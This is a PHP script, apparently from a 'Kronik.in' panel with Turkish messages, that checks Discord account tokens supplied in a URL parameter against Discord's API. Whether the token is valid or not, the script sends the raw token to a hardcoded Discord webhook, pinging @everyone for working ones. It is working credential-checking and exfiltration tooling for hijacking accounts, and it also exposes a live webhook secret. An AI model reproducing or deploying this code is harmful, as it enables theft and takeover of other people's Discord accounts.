<?php
include_once "../../server/authcontrol.php";

$token = htmlspecialchars($_GET['lista']);

$url = 'https://discord.com/api/v8/users/@me';
$proxy = '95.170.156.220:808';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Authorization: $token"
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$curl_scraped_page = curl_exec($ch);
$info = curl_getinfo($ch);
if ($info["http_code"] === 200) {
	echo "başarılı";
	$tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/938170216746205235/qU140jWRw7t15yakx2agAI4K4A6NnoyA7k6jqDuliP9aiK684NKzEzqsejMzDCMkN65J";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
					
					"content" => "@everyone",
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.in",

                            
                            "type" => "rich",

                           
                            "description" => "Discord | ✅ #Aktif - $token",

                            
                            "url" => "https://Kronik.in",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
} else {
	$tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/938170216746205235/qU140jWRw7t15yakx2agAI4K4A6NnoyA7k6jqDuliP9aiK684NKzEzqsejMzDCMkN65J";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.in",

                            
                            "type" => "rich",

                           
                            "description" => "Discord | ❌ #Kapalı - $token",

                            
                            "url" => "https://Kronik.in",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
}
$fim = json_decode($curl_scraped_page, true);
curl_close($ch);
